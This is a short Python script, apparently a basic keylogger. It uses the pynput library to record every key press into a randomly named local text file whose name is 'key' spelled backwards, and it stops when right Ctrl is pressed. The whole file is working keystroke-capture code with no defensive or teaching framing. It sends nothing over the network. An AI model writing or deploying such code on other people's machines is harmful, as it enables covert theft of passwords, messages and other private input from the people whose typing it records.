from pynput.keyboard import Listener, Key
import sys
import random
import Xlib.error

log = f'yek{random.randint(0,1000)}.txt'

def catch_key(key):
    try:
        with open(log, 'a') as file:
            file.write(f'{str(key)} \n')
    except Exception as e:
        print(f'Error writing to log: {e}')

    if key == Key.ctrl_r:
        logs.stop()

try:
    with Listener(on_press=catch_key) as logs:
        logs.join()
except Xlib.error.ConnectionClosedError:
    print('Display connection closed by client. Exiting...')
except Exception as e:
    print(f"Error in running the program: {e}")
finally:
    sys.exit()
